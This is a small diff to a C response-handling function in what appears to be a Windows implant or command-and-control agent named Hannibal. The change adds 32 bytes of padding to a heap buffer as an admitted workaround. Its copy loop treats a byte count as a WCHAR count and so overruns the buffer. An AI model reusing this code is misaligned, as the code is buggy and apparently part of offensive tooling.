@@ -17,7 +17,8 @@ SECTION_CODE void hannibal_response(LPCWSTR message, LPCSTR task_uuid)
     HANNIBAL_INSTANCE_PTR
 
     size_t msg_size = pic_strlenW(message)*sizeof(WCHAR) + 2;
-    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, msg_size);
+    // Added padding due to heapfree issues. This is not very elegant. A better approach would be to calculate usage correctly.
+    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, msg_size + 32);
 
     for (int i = 0; i < msg_size; i++) {
         response_content[i] = message[i];
